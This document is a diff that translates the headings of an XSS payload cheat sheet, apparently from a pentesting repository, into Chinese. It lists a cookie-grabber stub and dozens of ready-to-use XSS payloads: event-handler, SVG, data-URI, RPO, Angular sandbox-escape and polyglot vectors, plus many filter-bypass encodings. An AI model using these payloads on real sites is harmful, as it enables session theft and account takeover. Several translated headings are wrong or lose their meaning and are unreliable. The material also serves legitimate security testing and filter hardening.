@@ -1,9 +1,9 @@
-# Cross Site Scripting
-Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.	
+# 跨站脚本攻击
+跨站脚本攻击(XSS)是一种针对计算机安全漏洞的攻击，多现于web应用中。XSS的原理是使攻击者能够将客户端脚本注入给其他用户看的网页中。	
 
-## Exploit code or POC
+## 开发代码或POC
 
-Cookie grabber for XSS
+为XSS抓取缓存
 ```
 <?php 
 // How to use it
@@ -18,7 +18,7 @@ fclose($fp);
 ?>
 ```
 
-## XSS in HTML/Applications 
+## HTML/应用中的XSS 
 XSS Basic
 ```
 Basic payload
@@ -44,7 +44,7 @@ Svg payload
 "><svg/onload=alert(/XSS/)
 ```
 
-XSS for HTML5
+HTML5的漏洞测试代码
 ```
 <body onload=alert(/XSS/.source)>
 <input autofocus onfocus=alert(1)>
@@ -60,7 +60,7 @@ XSS for HTML5
 ```
 
 
-XSS in META tag
+针对META标签的XSS攻击
 ```
 Base64 encoded
 <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
@@ -71,7 +71,7 @@ With an additional URL
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
 ```
 
-XSS in flash application
+针对flash应用的XSS攻击
 ```
  \%22})))}catch(e){alert(document.domain);}// 
 
@@ -80,7 +80,7 @@ XSS in flash application
  "a")(({type:"ready"}));}catch(e){alert(1)}// 
 ```
 
-XSS in Hidden input
+针对Hidden属性的input标签的XSS攻击触发
 ```
 <input type="hidden" accesskey="X" onclick="alert(1)">
 Use CTRL+SHIFT+X to trigger the onclick event
@@ -91,8 +91,8 @@ DOM XSS
 #"><img src=/ onerror=alert(2)>
 ```
 
-## XSS in wrappers javascript and data URI
-XSS with javascript:
+## 关于java脚本封装和data URI中的XSS攻击
+java脚本中的XSS攻击:
 ```
 javascript:prompt(1)
 
@@ -118,18 +118,18 @@ javascript://%0Aalert(1)
 javascript://anything%0D%0A%0D%0Awindow.alert(1)
 ```
 
-XSS with data:
+利用data进行XSS攻击:
 ```
 data:text/html,<script>alert(0)</script>
 data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
 ```
 
-XSS with vbscript: only IE
+利用vb脚本进行XSS攻击: 只限IE浏览器
 ```
 vbscript:msgbox("XSS")
 ```
-## XSS in files
-XSS in XML
+## 文件中的XSS攻击
+利用XML进行XSS攻击
 ```
 <html>
 <head></head>
@@ -140,7 +140,7 @@ XSS in XML
 ```
 
 
-XSS in SVG
+利用SVG进行XSS攻击
 ```
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
@@ -153,12 +153,12 @@ XSS in SVG
 </svg>
 ```
 
-XSS in SVG (short)
+利用SVG进行XSS攻击 (简略版)
 ```
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
 ```
 
-XSS in SWF
+利用SWF进行XSS攻击
 ```
 Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
 IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
@@ -176,17 +176,17 @@ more payloads in ./files
 
 
 
-## XSS with Relative Path Overwrite - IE 8/9 and lower
+## 利用RPO漏洞进行XSS攻击 - IE 8/9或更低版本
 
-You need these 3 components
+你需要准备下面三个部分
 ```
-1) stored XSS that allows CSS injection. : {}*{xss:expression(open(alert(1)))}
-2) URL Rewriting.
-3) Relative addressing to CSS style sheet : ../style.css
+1) 可以进行CSS注入的存储式XSS漏洞. : {}*{xss:expression(open(alert(1)))}
+2) URL地址重写.
+3) CSS样式表的相对地址 : ../style.css
 
 ```
 
-A little example 
+举个例子 
 ```
 http://url.example.com/index.php/[RELATIVE_URL_INSERTED_HERE]
 <html>
@@ -200,11 +200,11 @@ Stored XSS with CSS injection - Hello {}*{xss:expression(open(alert(1)))}
 </html>
 ```
 
-Explanation of the vulnerability
+漏洞解释
 ```
-The Meta element forces IE’s document mode into IE7 compat which is required to execute expressions. Our persistent text {}*{xss:expression(open(alert(1)))is included on the page and in a realistic scenario it would be a profile page or maybe a shared status update which is viewable by other users. We use “open” to prevent client side DoS with repeated executions of alert. 
+Meta标签使IE的文件模式兼容IE7，这需要执行一些表达式。我们已存储的文本 {}*{xss:expression(open(alert(1)))可以在一页上显示，而在实践中，它会以一个资料页的形式出现，或者是可以让其他用户看到的可分享的一个状态更新。我们用“open”去反复执行alert去防止客户端的Dos。  
 
-A simple request of “rpo.php/” makes the relative style load the page itself as a style sheet. The actual request is “/labs/xss_horror_show/chapter7/rpo.php/styles.css” the browser thinks there’s another directory but the actual request is being sent to the document and that in essence is how an RPO attack works.
+一个简单的“rpo.php/”请求使相关的样式加载当前页面本身作为一个样式表，实际上的请求应是“/labs/xss_horror_show/chapter7/rpo.php/styles.css”，浏览器认为这里应该有另一个目录，但这个请求已经被送给了document。这就是RPO攻击的工作原理。 
 
 Demo 1 at http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo.php
 Demo 2 at http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo2.php/fakedirectory/fakedirectory2/fakedirectory3
@@ -215,15 +215,15 @@ From : http://www.thespanner.co.uk/2014/03/21/rpo/
 ```
 
 
-## Mutated XSS for Browser IE8/IE9
+## 浏览器IE8和IE9版本中XSS的变形
 ```
 <listing id=x>&lt;img src=1 onerror=alert(1)&gt;</listing>
 <script>alert(document.getElementById('x').innerHTML)</script>
 ```
- IE will read and write (decode) HTML multiple time and attackers XSS payload will mutate and execute. 
+IE将会读和写（破译）HTML很多次，这样攻击者的远程脚本攻击便得以变形和执行。 
 
 
-## XSS in Angular
+## Angular中的XSS
 Angular 1.6.0
 ```
 {{0[a='constructor'][a]('alert(1)')()}}
@@ -334,7 +334,7 @@ Angular 1.0.1 - 1.1.5
 {{constructor.constructor('alert(1)')()}}
 ```
 
-## Polyglot XSS
+## XSS测试万能代码
 Polyglot XSS - 0xsobky
 ```
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
@@ -356,19 +356,19 @@ Polyglot XSS - Rsnake
 ```
 
 
-## Filter Bypass and exotic payloads
+## 绕过过滤器 and exotic payloads
 
-Bypass case sensitive
+大小写区分
 ```
 <sCrIpt>alert(1)</ScRipt>
 ```
 
-Bypass quotes for string
+引号中的字符串
 ```
 String.fromCharCode(88,83,83)
 ```
 
-Bypass quotes in script tag
+引号中的脚本标签
 ```
 http://localhost/bla.php?test=</script><script>alert(1)</script>
 <html>
@@ -378,63 +378,63 @@ http://localhost/bla.php?test=</script><script>alert(1)</script>
 </html>
 ```
 
-Bypass quotes in mousedown event
+引号中的mousedown事件
 ```
 <a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
 
 You can bypass a single quote with &#39; in an on mousedown event handler
 ```
 
-Bypass dot filter 
+绕过点过滤器 
 ```
 <script>window['alert'](document['domain'])<script>
 ```
 
-Bypass parenthesis for string - Firefox
+括号中的字符串 - Firefox
 ```
 alert`1`
 ```
 
-Bypass onxxxx= blacklist
+Bypass onxxxx= 黑名单
 ```
 <object onafterscriptexecute=confirm(0)>
 <object onbeforescriptexecute=confirm(0)>
 ```
 
-Bypass onxxx= filter with a null byte/vertical tab - IE/Safari
+Bypass onxxx= 过滤一个空字节/纵向制表 - IE/Safari
 ```
 <img src='1' onerror\x00=alert(0) />
 <img src='1' onerror\x0b=alert(0) />
 ```
 
-Bypass onxxx= filter with a '/' - IE/Firefox/Chrome/Safari
+Bypass onxxx= 过滤'/'符号 - IE/Firefox/Chrome/Safari
 ```
 <img src='1' onerror/=alert(0) />
 ```
 
-Bypass space filter with "/" - IE/Firefox/Chrome/Safari
+用"/"符号绕过空格过滤器 - IE/Firefox/Chrome/Safari
 ```
 <img/src='1'/onerror=alert(0)>
 ```
 
-Bypass with incomplete html tag - IE/Firefox/Chrome/Safari
+绕过不完整的html标记 - IE/Firefox/Chrome/Safari
 ```
 <img src='1' onerror='alert(0)' <
 ```
 
-Bypass document blacklist
+绕过文件黑名单
 ```
 <div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
 ```
 
-Bypass using javascript inside a string
+利用包含Java脚本的字符串
 ```
 <script>
 foo="text </script><script>alert(1)</script>";
 </script>
 ```
 
-Bypass using an alternate way to execute an alert
+利用交替的方式来执行一个alert
 ```
 <script>window['alert'](0)</script>
 <script>parent['alert'](1)</script>
@@ -442,7 +442,7 @@ Bypass using an alternate way to execute an alert
 <script>top['alert'](3)</script>
 ```
 
-Bypass using an alternate way to trigger an alert
+利用交替的方式来触发一个alert
 ```
 var i = document.createElement("iframe");
 i.onload = function(){
@@ -464,7 +464,7 @@ XSSObject.proxy(window, 'alert', 'window.alert', false);
 ```
 
 
-Bypass ';' using another character
+换一个字符来绕过';' 
 ```
 'te' * alert('*') * 'xt';
 'te' / alert('/') / 'xt';
@@ -483,7 +483,7 @@ Bypass ';' using another character
 'te' instanceof alert('instanceof') instanceof 'xt';
 ```
 
-Bypass using Unicode
+利用Unicode
 ```
 Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
 transformed into U+003C LESS­THAN SIGN (<)
@@ -508,18 +508,18 @@ E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert
 %EF%BC%9C becomes <
 ```
 
-Bypass using unicode converted to uppercase
+利用unicode转换大小写
 ```
 İ (%c4%b0).toLowerCase() => i
 ı (%c4%b1).toUpperCase() => I
 ſ (%c5%bf) .toUpperCase() => S
-K (%E2%84%AA).toLowerCase() => k
+K (%E2%84%AA).toLowerCase() => k
 
 <ſvg onload=... > become <SVG ONLOAD=...> 
 <ıframe id=x onload=>.toUpperCase() become <IFRAME ID=X ONLOAD=>
 ```
 
-Bypass using overlong UTF-8
+利用过长的UTF-8
 ```
 < = %C0%BC = %E0%80%BC = %F0%80%80%BC
 > = %C0%BE = %E0%80%BE = %F0%80%80%BE
@@ -529,12 +529,12 @@ Bypass using overlong UTF-8
 ' = %CA%B9
 ```
 
-Bypass using UTF-7
+利用UTF-7
 ```
 +ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
 ```
 
-Bypass using weird encoding or native interpretation to hide the payload (alert())
+利用奇怪的编码或native interpretation来隐藏 (alert())
 ```javascript
 <script>\u0061\u006C\u0065\u0072\u0074(1)</script>
 <img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
@@ -562,7 +562,7 @@ Exotic payloads
 ```
 
 
-## Thanks to
+## 感谢
 * https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 * tbm
 * http://infinite8security.blogspot.com/2016/02/welcome-readers-as-i-promised-this-post.html
